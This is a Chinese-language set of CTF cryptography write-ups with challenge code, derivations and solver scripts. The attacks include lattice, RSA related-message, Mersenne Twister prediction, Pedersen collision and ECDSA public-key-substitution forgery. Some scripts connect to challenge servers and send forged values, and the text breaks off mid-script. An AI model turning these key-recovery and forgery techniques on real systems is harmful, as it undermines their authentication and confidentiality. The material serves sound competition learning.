16358502146569154805821117102055792126075384391997576813810358118942744612520734385485210209088310766263140599554175000067735671573064419087690267925715334913530155481001158890983091873663077846204509925514040559562873128373049378251801304882824014436351821387973582562165652240535121822439156888350175610414618000437008389187928342072924670546637964062394868004556705496699646429981923137500855492623070913023804420063661041841121617920375160117028363526191248710373415720637387593795136212298387121644166224488964182846517612830649792045421886212347661276446680662471149305906153415890365792363053111611744767732723 b = \u0026#34;**********\u0026#34; d = 1004034638166310792730607806775703553124564601554345421260673 flag=\u0026#34;flag{*************}\u0026#34;.encode(\u0026#34;utf-8\u0026#34;) m = bytes_to_long(flag) z = \u0026#34;**********\u0026#34; rb = gmpy2.invert(b, p) #p应为a rd = gmpy2.invert(d, p) #p应为a x = rb*rd c = (m + z * rb * d % a)%a assert(x==6315659043002030386732628047413448608037014021450055783529151485037069834363316696715574624507364755209361330204858147422873261866250183596759294051863367248800298182067900158706847792801508096127972864438349393635089442050383307416911012903769591812354414290225858817653700560363386018244490076357373032578412217266586094695255045411910123500620718125148007865650934761243821251725823364164494857358344030633984045814182753879152597382860304163779884435644346012876829684180445183686922253767338719485395107909704323571278192414797079570675523716981179479127876875936828316228191746093521584500893126198631718691478) assert(c == 13596888613593355909989922489890598098147006404940300566769884949973269155719149670825677093684865700611084990815597885910353735947129944271345041538903031681298587672182524580124290627382140539264797169742520543929318842181890234622629255911624719400312152476306595541663238469772749767491911131691767357337344670678126067823905376191196367985379783363614691429132347967869598160549130755596368301366502209859435570988428790501722994265227987470237460083210385323943246674820772425514186206511159274330451656105100385024137631498256411854720506611702496670593426888793357086314109878603547497784715623917384308274129) assert(log(d)/log(2)\u0026lt;=200) assert(log(z)/log(2)\u0026lt;=1024) 推导：\n由 $rb \\equiv b^{-1} \\pmod a$ 和 $rd \\equiv d^{-1} \\pmod a$ ，有 $rb \\cdot b \\cdot rd \\cdot d = x \\cdot b \\cdot d \\equiv 1 \\pmod a$。\n故求出 $b \\equiv (x \\cdot d)^{-1} \\pmod a$，$rb \\equiv b^{-1} \\pmod a$。\n又 $c = (m+z \\cdot rb \\cdot d) \\bmod a$，构造格 $L=\\begin{bmatrix} 1 \u0026amp; rb \\cdot d \\ 0 \u0026amp; a \\end{bmatrix}$，利用LLL算法求解：\na = 16358502146569154805821117102055792126075384391997576813810358118942744612520734385485210209088310766263140599554175000067735671573064419087690267925715334913530155481001158890983091873663077846204509925514040559562873128373049378251801304882824014436351821387973582562165652240535121822439156888350175610414618000437008389187928342072924670546637964062394868004556705496699646429981923137500855492623070913023804420063661041841121617920375160117028363526191248710373415720637387593795136212298387121644166224488964182846517612830649792045421886212347661276446680662471149305906153415890365792363053111611744767732723 d = 1004034638166310792730607806775703553124564601554345421260673 x = 6315659043002030386732628047413448608037014021450055783529151485037069834363316696715574624507364755209361330204858147422873261866250183596759294051863367248800298182067900158706847792801508096127972864438349393635089442050383307416911012903769591812354414290225858817653700560363386018244490076357373032578412217266586094695255045411910123500620718125148007865650934761243821251725823364164494857358344030633984045814182753879152597382860304163779884435644346012876829684180445183686922253767338719485395107909704323571278192414797079570675523716981179479127876875936828316228191746093521584500893126198631718691478 c = 13596888613593355909989922489890598098147006404940300566769884949973269155719149670825677093684865700611084990815597885910353735947129944271345041538903031681298587672182524580124290627382140539264797169742520543929318842181890234622629255911624719400312152476306595541663238469772749767491911131691767357337344670678126067823905376191196367985379783363614691429132347967869598160549130755596368301366502209859435570988428790501722994265227987470237460083210385323943246674820772425514186206511159274330451656105100385024137631498256411854720506611702496670593426888793357086314109878603547497784715623917384308274129 import gmpy2 b = gmpy2.invert(x*d,a) rb = gmpy2.invert(b,a) rd = gmpy2.invert(d,a) h = rb*d%a p = a v1 = vector(ZZ, [1, h]) v2 = vector(ZZ, [0, p]) m = matrix([v1,v2]); f, g = m.LLL()[0] f, g = -f, -g #print(f, g) a = f*c % p % g m = a * inverse_mod(f, g) % g print(bytes.fromhex(hex(m)[2:])) #b\u0026#39;flag{we1c0mE_t0_cr4aK_mE!}\u0026#39; GKCTFxDASCTF应急挑战杯 # Random # import random from hashlib import md5 def get_mask(): file = open(\u0026#34;random.txt\u0026#34;,\u0026#34;w\u0026#34;) for i in range(104): file.write(str(random.getrandbits(32))+\u0026#34;\\n\u0026#34;) file.write(str(random.getrandbits(64))+\u0026#34;\\n\u0026#34;) file.write(str(random.getrandbits(96))+\u0026#34;\\n\u0026#34;) file.close() get_mask() flag = md5(str(random.getrandbits(32)).encode()).hexdigest() print(flag) 根据 random.txt 中104组 random.getrandbits() 函数输出值，利用预测工具 Mersenne Twister Predictor 来求出下一个随机数：\nimport random from mt19937predictor import MT19937Predictor from hashlib import md5 predictor = MT19937Predictor() file = open(\u0026#34;random.txt\u0026#34;,\u0026#34;r\u0026#34;).readlines() c1 = [] c2 = [] c3 = [] for k in range(0,len(file),3): c1 += [int(file[k].strip())] c2 += [int(file[k+1].strip())] c3 += [int(file[k+2].strip())] for k in range(104): predictor.setrandbits(c1[k], 32) predictor.setrandbits(c2[k], 64) predictor.setrandbits(c3[k], 96) print(md5(str(predictor.getrandbits(32)).encode()).hexdigest()) #14c71fec812b754b2061a35a4f6d8421 RSA # Just RSA!\nfrom Crypto.Util.number import * from sympy import nextprime import gmpy2 import random def encode (p1,p2,e): not_hint = (p1 + 1) * (p2 + 1) S = gmpy2.invert(e, not_hint) not_p = S%(p1+1) return not_p flag = b\u0026#39;Neepu{********************}\u0026#39; flag = bytes_to_long(flag) p = getPrime(512) q = getPrime(512) n = p*q e = nextprime(random.randint(1,1000)) d = gmpy2.invert(e, (p-1)*(q-1)) c = pow(flag, e, n) print(c) print(n) m = encode(p, q, e) c1 = pow(m, 7, n) c2 = pow(m+e, 7, n) print(c1) print(c2) \u0026#39;78543767285872349029076059073458316000847341792088805258173041942425687239313215276670106926320359777962661495032475004417723103701253550583245518206305422982968675291500865382213182669036827898932991063338163290845510339896689210314509493839746410486257998875782496654704288722251878269643040214139429715671\u0026#39; \u0026#39;91995272927105081122659192011056020468305570748555849650309966887236871318156855318666540461669669247866754568189179687694315627673545298267458869140096224628114424176937828378360997230874932015701507629238213240839370628366083111028544554453150572165461450371411341485911677167168492357154684642531577228543\u0026#39; \u0026#39;10186066785511829759164194803209819172224966119227668638413350199662683285189286077736537161204019147791799351066849945954518642600518196927152098131117402608793752080104402893792812059620726950782670809837962606250674588612783027976958719051829085903720655233948024280118985875980227528403883475592567727892\u0026#39; \u0026#39;46182103994299145562022812023438495797686077104477472631494150222038404419414100727667171290098624214113241032861128455086601197239761085752413519627251290509474327611253599768650908336142621210005389246714504358370629231557080301516460985022782887233790302054696967900384601182742759555421864610431428746119\u0026#39; 两部分：\n第一部分 $n=pq,c=\\text{flag}^e \\bmod n$，\n第二部分 $m=\\text{enc}(p,q,e),c_1=m^7 \\bmod n,c_2=(m+e)^7 \\bmod n$。\n先解第二部分，利用Related Message Attack求解 $m$，由于 $e$ 未知且 $e\u0026lt;1010$，爆破 $e$ 求出 $m$：\nimport binascii def attack(c1, c2, n, e): PR.\u0026lt;x\u0026gt; = PolynomialRing(Zmod(n)) g1 = (x)^7 - c1 g2 = (x+e)^7 - c2 def gcd(g1, g2): while g2: g1, g2 = g2, g1 % g2 return g1.monic() return -gcd(g1, g2)[0] c1 = 10186066785511829759164194803209819172224966119227668638413350199662683285189286077736537161204019147791799351066849945954518642600518196927152098131117402608793752080104402893792812059620726950782670809837962606250674588612783027976958719051829085903720655233948024280118985875980227528403883475592567727892 c2 = 46182103994299145562022812023438495797686077104477472631494150222038404419414100727667171290098624214113241032861128455086601197239761085752413519627251290509474327611253599768650908336142621210005389246714504358370629231557080301516460985022782887233790302054696967900384601182742759555421864610431428746119 n = 91995272927105081122659192011056020468305570748555849650309966887236871318156855318666540461669669247866754568189179687694315627673545298267458869140096224628114424176937828378360997230874932015701507629238213240839370628366083111028544554453150572165461450371411341485911677167168492357154684642531577228543 for e in range(1,1000): m = attack(c1, c2, n, e) try: if pow(m,7,n) == c1: print((e,m)) except: pass #结果：(71, 129256555243625096140386916253259867206651269142565502540823654159666398099455456877012993395632742360829588042575108302297567291349420390228163587340859) #e = 71 #m = 129256555243625096140386916253259867206651269142565502540823654159666398099455456877012993395632742360829588042575108302297567291349420390228163587340859 又 $m=\\text{enc}(p,q,e)$，即 $eS=ed \\equiv 1 \\pmod {(p+1)(q+1)},dp=S \\bmod (p+1)=d \\bmod (p+1)$，\n由于 $e \\cdot dp \\equiv e \\cdot d \\equiv 1 \\pmod {(p+1)}$，有 $e \\cdot dp-1=k \\cdot (p+1)$，\n比较 $e \\cdot dp$ 与 $p$ 比特位数相近，故 $k$ 值不大，\n爆破 $k$，当同时满足 $(e \\cdot dp-1) \\bmod k =0$ 和 $n \\bmod \\Big(\\cfrac{e \\cdot dp-1}{k}-1\\Big)$ 时，$n$ 成功分解。\nn = 91995272927105081122659192011056020468305570748555849650309966887236871318156855318666540461669669247866754568189179687694315627673545298267458869140096224628114424176937828378360997230874932015701507629238213240839370628366083111028544554453150572165461450371411341485911677167168492357154684642531577228543 dp = 129256555243625096140386916253259867206651269142565502540823654159666398099455456877012993395632742360829588042575108302297567291349420390228163587340859 e = 71 c = 78543767285872349029076059073458316000847341792088805258173041942425687239313215276670106926320359777962661495032475004417723103701253550583245518206305422982968675291500865382213182669036827898932991063338163290845510339896689210314509493839746410486257998875782496654704288722251878269643040214139429715671 for k in range(1,10000): if (e*dp-1)%k == 0: p = (e*dp-1)//k-1 if n%p == 0: q = n//p print((k,p,q)) 最后常规RSA求得flag。\n红明谷杯数据安全大赛技能场景赛 # ezCRT # Chinese Remainder Theorem is fantastic\nfrom Crypto.Util.number import * import gmpy2 from random import shuffle flag = b\u0026#34;flag is here\u0026#34; def shuffle_flag(s): str_list = list(s) shuffle(str_list) return \u0026#39;\u0026#39;.join(str_list) nl = [] el = [] count = 0 while count != 5: p = getPrime(512) q = getPrime(512) n = p * q phi = (p - 1) * (q - 1) d = gmpy2.next_prime(bytes_to_long(flag)) e = gmpy2.invert(d, phi) nl.append(n) el.append(int(e)) count += 1 print(nl) print(el) cl = [] flag = shuffle_flag(flag.decode()).encode() for i in range(len(nl)): cl.append(pow(bytes_to_long(flag), el[i], nl[i])) print(cl) 五组 $n,e$，共私钥 $d$，用LLL算法打。发现 $n$ 都已帮从小到大排好序，一步到位。\n由于 d = gmpy2.next_prime(bytes_to_long(flag))，求出 $d$ 后往回遍历拿到flag。\n#Sage from gmpy2 import * n = e = c = M=iroot(int(n[4]),int(2))[0] a = [0]*6 a[0] = [M,e[0],e[1],e[2],e[3],e[4]] a[1] = [0,-n[0],0,0,0,0] a[2] = [0,0,-n[1],0,0,0] a[3] = [0,0,0,-n[2],0,0] a[4] = [0,0,0,0,-n[3],0] a[5] = [0,0,0,0,0,-n[4]] Mat = matrix(ZZ,a) Mat_LLL = Mat.LLL() d = abs(Mat_LLL[0][0]) // M for k in range(1500): print(bytes.fromhex(hex(d-k)[2:])) Crypto_System # 从[CyBRICS 2020 - Too Secure](\rhttp://ctfteam.com/writeup/8/Too Secure)魔改的Pedersen加密，算法描述：\n已知信息 $m_1,m_2$和 $m_1$ 的 $r_1$，$m_1$ 通过因子 $r_1$ 加密得到 $c_1$，需要求出因子 $r_2$，使得 $m_2$ 通过 $r_2$ 加密得到的 $c_2$ 与 $c_1$ 相同，即产生碰撞。\n对于待加密信息 $m_1$，$c_1=g^{m_1}h_1^{r_1}$，注意到 $h_1=g^{a_1}$，故 $c_1=g^{m_1+a_1r_1}$；\n要碰撞信息 $m_2$ 的因子 $r_2$ 应满足 $c_2=c_1$，即 $m_1+a_1r_1 \\equiv m_2+a_2r_2 \\pmod {\\varphi(p)}$，\n又 $q$ 为 $g$ 的阶，所以有 $m_1+a_1r_1 \\equiv m_2+a_2r_2 \\pmod q$，\n故 $r_2 \\equiv (m_1+a_1r_1-m_2) \\pmod q$，即可求出 $r_2$。\nExp：\n#python2 from pwn import * from parse import * from pwnlib.util.iters import bruteforce import string from hashlib import sha256 from Crypto.Util.number import * import hashlib from gmpy2 import gcd,invert def brute_force(prefix,s): return bruteforce(lambda x:sha256(x+prefix).hexdigest()==s,string.ascii_letters+string.digits,length=4,method=\u0026#39;fixed\u0026#39;) p = 12039102490128509125925019010000012423515617235219127649182470182570195018265927223 g = 10729072579307052184848302322451332192456229619044181105063011741516558110216720725 def int2str(data, mode=\u0026#34;big\u0026#34;): if mode == \u0026#34;little\u0026#34;: return sum([ord(data[_]) * 2 ** (8 * _) for _ in range(len(data))]) elif mode == \u0026#34;big\u0026#34;: return sum([ord(data[::-1][_]) * 2 ** (8 * _) for _ in range(len(data))]) def get_parameter(m): x = int2str(m, \u0026#39;little\u0026#39;) y = pow(g, x, p) a = bytes_to_long(hashlib.sha256(long_to_bytes(y).rjust(128, \u0026#34;\\0\u0026#34;)).digest()) b = pow(a, a, p - 1) h = pow(g, b, p) return x, y, h, b def sign(m, r): x, y, h, b = get_parameter(m) s = (y * pow(h, r, p)) % p return s def verify(m, r, s): x, y, h, b = get_parameter(m) if s == ((y * pow(h, r, p)) % p): return True else: return False r=remote(\u0026#39;139.129.98.9\u0026#39;,30001) data = r.recvline() prefix, s = parse(\u0026#34;sha256(XXXX+{}) == {}\u0026#34;,data) r.recvuntil(\u0026#39;Give me XXXX:\u0026#39;) r.sendline(brute_force(prefix,s)) r.recvline() r.recvline() m1 = long_to_bytes(int(parse(\u0026#34;Here is the frist message(64 bytes):{}\u0026#34;,r.recvline())[0],16)) m2 = long_to_bytes(int(parse(\u0026#34;Here is the second message(64 bytes):{}\u0026#34;,r.recvline())[0],16)) r1 = int(parse(\u0026#34;The frist message\u0026#39;s \u0026#39;r\u0026#39;:{}\u0026#34;,r.recvline())[0]) print(m1) print(m2) #sage solve order q: g^q=1(mod p) q = 1039300813886545966418005631983853921163721828798787466771912919828750891 assert(pow(g, q, p) == 1) assert(gcd(q, p-1) == q) M1,y1,h1,b1 = get_parameter(m1) M2,y2,h2,b2 = get_parameter(m2) s1 = sign(m1, r1) p1 = b1*r1 p2 = M2-M1 p3 = p1-p2 p4 = invert(b2,q) r2 = (p3*p4)%q s2 = sign(m2,r2) if s1==s2: print(\u0026#39;r1 = \u0026#39;+str(r1)) print(\u0026#39;r2 = \u0026#39;+str(r2)) print(\u0026#39;s1 = \u0026#39;+str(s1)) print(\u0026#39;s2 = \u0026#39;+str(s2)) print(\u0026#39;verify(m2,r2,s2) = \u0026#39;+str(verify(m2,r2,s2))) r.recvuntil(\u0026#39;Please choice your options:\u0026#39;) r.sendline(\u0026#39;3\u0026#39;) r.sendlineafter(\u0026#39;Please give me the (r,s) of the second message:\u0026#39;,\u0026#39;(\u0026#39;+str(r2)+\u0026#39;,\u0026#39;+str(s2)+\u0026#39;)\u0026#39;) print(r.recvall()) ROARCTF2020 # Reverse # 参考 https://kt.gy/blog/2015/10/asis-2015-finals-rsasr/ 因为p和q是二进制顺序相反的素数，所以p的每一位都和q有关系。所以我们可以尝试遍历p的二进制，通过判断生成的p与q再进行迭代。具体代码如下：\nn = 158985980192501034004997692253209315116841431063210516613522548452327355222295231366801286879768949611058043390843949610463241574886852164907094966008463721486557469253652940169060186477803255769516068561042756903927308078335838348784208212701919950712557406983012026654876481867000537670622886437968839524889 def Brute_force(a,b,k): if k == 256: if a*b==n: print (a,b) return 0 for i in range(2): for j in range(2): a1=a+i*(2**(511-k))+j*(2**k) b1=b+j*(2**(511-k))+i*(2**k) if a1*b1\u0026gt;n: continue if (a1+2**(511-k))*((b1+2**(511-k)))\u0026lt; n: continue if (a1*b1)%(2**(k+1)) != n%(2**(k+1)): continue Brute_force(a1,b1,k+1) return 0 Brute_force(0,0,0) ECDSA # 这道题贼狠，源码都不给，来看一看MENU叭\n[DEBUG] Received 0xd bytes: b\u0026#39;Give me XXXX:\u0026#39; [DEBUG] Sent 0x5 bytes: b\u0026#39;bwUI\\n\u0026#39; [DEBUG] Received 0x4f bytes: b\u0026#39;Hello,guys!Welcome to my ECC Signature System!I promise no one can exploit it!\\n\u0026#39; [DEBUG] Received 0x269 bytes: b\u0026#39;Howevers if you can exploit it in 10 times,I will give what you want!\\n\u0026#39; b\u0026#39;Here is the frist message(64 bytes):fipoN9jy/*@~J:] PcZY8{\u0026amp;X!7v+\\\\duTln_#k(WK^Q2L)\u0026lt;SbM$-V=Ex3Uw|h,%}F\\n\u0026#39; b\u0026#39;Here is the second message(64 bytes):%wh-(xJ4kR+7\u0026lt;^Zv9,Ol\\\\Kp/\u0026amp;\u0026#34;FHbc_ D@Y*mSos}V?.#L{!3B8QiP=nqCI[y:X2\\n\u0026#39; b\u0026#39;Try to calculate the same signature for this two messages~\\n\u0026#39; b\u0026#39;(((Notice: curve = SECP256k1, hashfunc = sha1)))\\n\u0026#39; b\u0026#39;\\n\u0026#39; b\u0026#39;ECC Signature System:\\n\u0026#39; b\u0026#39; 1. Show your pubkey\\n\u0026#39; b\u0026#39; 2. Generate new prikey\\n\u0026#39; b\u0026#39; 3. Update your pubkey\\n\u0026#39; b\u0026#39; 4. Sign a message\\n\u0026#39; b\u0026#39; 5. Verify a message\\n\u0026#39; b\u0026#39; 6. Exploit\\n\u0026#39; b\u0026#39; 7. Exit\\n\u0026#39; b\u0026#39;\\n\u0026#39; b\u0026#39;You have only 10 times to operate!\\n\u0026#39; b\u0026#39;Please choice your options:\u0026#39; 根据题目名这是一个ECDSA的签名系统，完了呢要求是给这他提供的两个msg签名，不仅验证要通过，而且签名还得一样。\n先来看看这几个功能，\n功能1是显示公钥，（可能要利用）\n功能2是重新生成一个私钥，（应该是没用的，没啥意义，生成后就是告诉你更新后的公钥）\n功能3是更新你的公钥，你来输入（这个肯定有点用）\n功能4是帮你签个名 （也许用得上）\n功能5是验证签名 （可以，但没必要）\n功能6就是整完了用来获取flag的了。\n六个功能一眼看来也就这个功能3可以用了。这里需要一点前置知识（现查就可以了，一样的），就是ECDSA签名的验证规则\n这种\r资料CSDN一抓一大把。\nimage-20201207214850259\n最后是判断 v = r，即 X.x = dG.x ,我们可以把验证公式提取出来，也即 $es^{-1}G + rs^{-1}Q = dG$\n注意到由于验证用的是公钥Q，然后题目是提供篡改公钥这个功能的，我们知道ECDSA中$Q = kG$, 其中k是私钥，那么其实等价于我们是可以篡改私钥的，即我们用自己的私钥去给一个信息签名，完了后把用于验证的公钥给改成我们自己的公钥，验证同样也是可以通过的。那么整个过程系统的私钥都不参与了。\n解决了签名验证的问题，剩下来就是解决如何让他们的签名保持一致了。\n回到验证公式 $es^{-1}G + rs^{-1}Q = dG$\n其中e是我们的消息，可以看作已知常数，r和s是我们能控制的，G是固定的，Q是公钥，也是我们自己决定，d是签名时用的随机数，整个签名的过程我们都能掌握，自然d也有我们决定，然后d会决定r，因为r = dG.x， 那么r也就固定下来了，只剩Q和s了。\n我们把公式约一约，去掉G后就是 $es^{-1} + rs^{-1}k = d =\u0026gt; e + rk = ds =\u0026gt; s = (e + rk)*d^{-1}$\n由于两个msg的s要保持一直，那么我们构造的等式就是$ (e_1 + rk) * d^{-1} = (e_2 + rk) * d^{-1}$\n很显然啊，因为d不能等于0，这等式不可能成立啊，于是陷入僵局。\n但这里我们忘了一个很重要的性质，就是，我们最后验证的是v = r，而r是什么，r = dG.x，我们要知道的是，椭圆曲线是一个关于x轴对称的图形，所以其实 r = -dG.x。华点都发现了，这题就解决了，\n等式变为$ (e_1 + rk) * d^{-1} = (e_2 + rk) * (-d)^{-1}$\n化成同余式就是$ (e_1 + rk) * d^{-1} \\equiv (e_2 + rk) * (-d)^{-1} \\pmod{n}$\n有 $e_1 + rk \\equiv -e_2 -rk\\pmod{n}$\n有 $k \\equiv \\frac{-e1-e2}{2r}\\pmod{n}$\n然后怕【我们去查一下这条曲线的\r参数即可\n参考脚本\nfrom pwn import * from Crypto.Util.number import * sh=remote(\u0026#34;139.129.98.9\u0026#34;,\u0026#34;30002\u0026#34;) from pwnlib.util.iters import mbruteforce from hashlib import sha256 import hashlib from math import gcd context.log_level = \u0026#39;debug\u0026#39; a=0 b=7 q=0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEFFFFFC2F gx=0x79BE667EF9DCBBAC55A06295CE870B07029BFCDB2DCE28D959F2815B16F81798 gy=0x483ADA7726A3C4655DA4FBFC0E1108A8FD17B448A68554199C47D08FFB10D4B8 order=0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141 ecc = EllipticCurve(GF(q), [a,b]) G = ecc(gx,gy) import hashlib def sha1(content): return hashlib.sha1(content).digest() def proof_of_work(sh): sh.recvuntil(\u0026#34;XXXX+\u0026#34;) suffix = sh.recvuntil(\u0026#39;)\u0026#39;).decode(\u0026#34;utf8\u0026#34;)[:-1] log.success(suffix) sh.recvuntil(\u0026#34;== \u0026#34;) cipher = sh.recvline().strip().decode(\u0026#34;utf8\u0026#34;) proof = mbruteforce(lambda x: sha256((x + suffix).encode()).hexdigest() == cipher, string.ascii_letters + string.digits, length=4, method=\u0026#39;fixed\u0026#39;) sh.sendlineafter(\u0026#34;Give me XXXX:\u0026#34;, proof) proof_of_work(sh) sh.recvuntil(\u0026#34;Here is the frist message(64 bytes):\u0026#34;) msg1 = sh.recvuntil(\u0026#34;\\n\u0026#34;)[:-1] sh.recvuntil(\u0026#34;Here is the second message(64 bytes):\u0026#34;) msg2 = sh.recvuntil(\u0026#34;\\n\u0026#34;)[:-1] message = hex(bytes_to_long(msg1))[2:] e1=bytes_to_long(sha1(msg1)) e2=bytes_to_long(sha1(msg2)) ###################################################### #解题核心 #pubkey = sh.recvuntil(\u0026#34;\\n\u0026#34;)[:-2].decode() #r=[d * G].x d=12321 r=int((d*G)[0]) new_k = ((-e1-e2)*inverse(2*r,order))%order new_Q = new_k * G new_S = ((e1 + new_k*r)*inverse(d,order))%order newpubkey = hex(new_Q[0]).replace(\u0026#34;0x\u0026#34;,\u0026#34;\u0026#34;).rjust(64,\u0026#34;0\u0026#34;)+hex(new_Q[1]).replace(\u0026#34;0x\u0026#34;,\u0026#34;\u0026#34;).rjust(64,\u0026#34;0\u0026#34;) newsignature = hex(r).replace(\u0026#34;0x\u0026#34;,\u0026#34;\u0026#34;).rjust(64,\u0026#34;0\u0026#34;)+hex(new_S).replace(\u0026#34;0x\u0026#34;,\u0026#34;\u0026#34;).rjust(64,\u0026#34;0\u0026#34;) ###################################################### sh.recvuntil(\u0026#34;Please choice your options:\u0026#34;) sh.sendline(\u0026#34;3\u0026#34;) sh.recvuntil(\u0026#34;Please give me your public_key(hex):\u0026#34;) sh.sendline(newpubkey) sh.recvuntil(\u0026#34;Please choice your options:\u0026#34;) sh.sendline(\u0026#34;6\u0026#34;) sh.recvuntil(\u0026#34;Please give me the signature(hex) of the frist message:\\n\u0026#34;) sh.sendline(newsignature) sh.recvuntil(\u0026#34;Please give me the signature(hex) of the second message:\\n\u0026#34;) sh.sendline(newsignature) sh.interactive() \u0026lt;\n\u0026gt;\nByteCTF # noise # 需要前置知识或了解：中国剩余定理\ntask.py\n#!/usr/bin/env python3\rfrom os import urandom\rfrom random import choices\rfrom hashlib import sha256\rimport signal\rimport string\rimport sys\rdef getrandbits(bit):\rreturn int.from_bytes(urandom(bit \u0026gt;\u0026gt; 3), \u0026#34;big\u0026#34;)\rdef proof_of_work() -\u0026gt; bool:\ralphabet = string.ascii_letters + string.digits\rnonce = \u0026#34;\u0026#34;.join(choices(alphabet, k=8))\rprint(f\u0026#39;SHA256(\u0026#34;{nonce}\u0026#34; + ?) starts with \u0026#34;00000\u0026#34;\u0026#39;)\rsuffix = input().strip()\rmessage = (nonce + suffix).encode(\u0026#34;Latin-1\u0026#34;)\rreturn sha256(message).digest().hex().startswith(\u0026#34;00000\u0026#34;)\rdef main():\rsignal.alarm(60)\rif not proof_of_work():\rreturn\rsecret = getrandbits(1024)\rprint(\u0026#34;Listen...The secret iz...M2@9c0f*#aF()I!($Ud3;J...\u0026#34;\r\u0026#34;Hello?...really noisy here again...God bless you get it...\u0026#34;)\rfor i in range(64):\rtry:\rop = input().strip()\rnum = input().strip()\rexcept EOFError:\rreturn\rif not str.isnumeric(num):\rprint(\u0026#34;INVALID NUMBER\u0026#34;)\rcontinue\rnum = int(num)\rif op == \u0026#39;god\u0026#39;:\rprint(num * getrandbits(992) % secret)\relif op == \u0026#39;bless\u0026#39;:\rif num == secret:\rtry:\rfrom datetime import datetime\rfrom flag import FLAG\rexcept Exception as e:\rFLAG = \u0026#34;but something is error. Please contact the admin.\u0026#34;\rprint(\u0026#34;CONGRATULATIONS %s\u0026#34;%FLAG)\rreturn\rprint(\u0026#34;WRONG SECRET\u0026#34;)\rmain() 还好，第一题代码量不大，不错不错。看一看，这一题功能很简单，你输入一个数字，他返回给你一个，你的数字 乘上一个992bit的 随机数字 模上一个1024bit的secret 的结果。当然，每次连接上后生成的secret是随机的，但是连上一次，可以交互64次，此时secret是保持不变的。算上你需要一次交互来获取flag，那么就是需要在63次之内“猜”到这个随机生成的secret。\n好的，上式子，我们知道中国剩余定理是这样子的\n$m \\equiv c_1 \\pmod {n_1}$ $m = c_1+k_1n_1$\n$m \\equiv c_2 \\pmod {n_2}$ 等价于 $m = c_2+k_2n_2$\n$m \\equiv c_3 \\pmod {n_3}$ $m = c_3+k_3n_3$\n注意这里的模是n，他们彼此互素，然后利用中国剩余定理就可以恢复m（如果m的bit位数小于所有n的bit位数之和的话）\n此时，如果k都等于1，那么，\n$m = c_1+n_1$ $m = n_1+c_1$\n$m = c_2+n_2$ 等价于 $m = n_2+c_2$\n$m = c_3+n_3$ $m = n_3+c_3$\n此时n和c就好像等价了，并不能知道模数到底是哪个，换一个说法就是，n和c都可以看作是模数\n我们再回到这道题本身，设我们发送的值是$n_1,n_2,n_3$，secret为s，返回的值是$c_1,c_2,c_3$，\n那么就会有这么些式子\n$n_1 * randnum1 \\equiv c_1 \\pmod s = c_1+k_1s$\n$n_2 * randnum2 \\equiv c_2 \\pmod s= c_2+k_2s$\n$n_3 * randnum3 \\equiv c_3 \\pmod s= c_3+k_3s$\n此时如果k值都为1，再挪个位置，那么就有\n$s = n_1 * randnum1- c_1$\n$s = n_2* randnum2 - c_2$\n$s = n_3 * randnum3- c_3$\n此时如果我们式子两边去一个模$n_1,n_2,n_3$\n$s \\equiv- c_1 \\pmod{n_1}$\n$s \\equiv- c_2 \\pmod{n_2}$\n$s \\equiv- c_3 \\pmod{n_3}$\n这不就是中国剩余定理形式么？所以当等于1，我们就可以利用中国剩余定理来恢复这个secret\n需要满足的条件就是，$n*randnum = c+s$，还有就是n的bit位数之和要大于s的bit位数即1024\n当然，这就需要运气了，因为他远程生成的乘数是随机的992bit数字（当然是有可能会小于992bit的），而s是1024bit的数字，所以我们要发送的n大概就是32bit的素数，32*32=1024，所以在63次交互内我们需要服务器生成32个随机数是“好”的，所谓”好””就是要让这个k正好等于1。\n我们也可以先本地简单的测一测，可以选择比较小的数给他乘，这样子的k大概率会是0或者1，而0比较好判断，直接判断返回的值是否被我们发送过去的数整除就可以了。而是否正好等于1我们是无法判断的，但凡一组数据插入了一个让k不等于1或者0的数，那么整组数据就作废了。所以我们发送尽量小的数n，让k值大概率只落在0或者1上。\n测试代码：\nfrom random import *\rprimes = [4294966427, 4294966441, 4294966447, 4294966477, 4294966553, 4294966583, 4294966591, 4294966619, 4294966639, 4294966651, 4294966657, 4294966661, 4294966667, 4294966769, 4294966813, 4294966829, 4294966877, 4294966909, 4294966927, 4294966943, 4294966981, 4294966997, 4294967029, 4294967087, 4294967111, 4294967143, 4294967161, 4294967189, 4294967197, 4294967231, 4294967279, 4294967291]\rfor _ in range(20):\rsecret = getrandbits(1024)\rfor num in primes:\rprint(num * getrandbits(992) // secret),\rprint 这里我们选择固定了随机数，然后经过20次的测试，下面是测试结果\nimage-20201102145925061\n可以发现，生成的随机数似乎也具有一定程度的局部性，当k出现7，8这样比较大的数的时候，几乎整组的k都比较大，但大部分情况下，由于我们输入的素数比较小，还是只有0和1的情况偏多，但一般也是0偏多，所以，，看脸了，只要有一半以上的1，我们就成功了。\n解题流程： # 确定63个比较小的素数 把这些值发送过去 收到的值进行一个判断，是否被自己发过去的数整除，是就扔掉，否则就存起来 存起来的数超过32个就可以进行CRT尝试恢复secret 发送secret过去验证，要是没拿到flag就回到第2步，如此循环往复，加油吧，看你的脸了！ exp：\nfrom pwn import * from hashlib import sha256 from tqdm import tqdm from Crypto.Util.number import * def GCRT(mi, ai): assert (isinstance(mi, list) and isinstance(ai, list)) curm, cura = mi[0], ai[0] for (m, a) in zip(mi[1:], ai[1:]): d = int(GCD(curm, m)) c = a - cura assert (c % d == 0) K = c // d * inverse(curm // d, m // d) cura += curm * K curm = curm * m // d cura %= curm return cura % curm, curm def proof_of_work(sh): sh.recvuntil(\u0026#34;SHA256(\\\u0026#34;\u0026#34;) nonce = sh.recv(8) sh.recvuntil(\u0026#39;with \\\u0026#34;00000\\\u0026#34;\u0026#39;) for a in tqdm(range(0x30, 0x7f)): for b in range(0x30, 0x7f): for c in range(0x30, 0x7f): for d in range(0x30, 0x7f): rest = chr(a) + chr(b) + chr(c) + chr(d) m = (nonce.decode(\u0026#39;latin1\u0026#39;) + rest).encode(\u0026#34;Latin-1\u0026#34;) if sha256(m).digest().hex().startswith(\u0026#34;00000\u0026#34;): sh.sendline(rest) sh.recvuntil(\u0026#39;again...God bless you get it...\u0026#39;) return def io(sh, num): sh.sendline(\u0026#39;god\u0026#39;) sh.sendline(str(num)) tmp = sh.recvuntil(\u0026#39;\\n\u0026#39;) if len(tmp) \u0026gt; 100: return int(tmp) else: return int(sh.recvuntil(\u0026#39;\\n\u0026#39;)) primes = [4294966427, 4294966441, 4294966447, 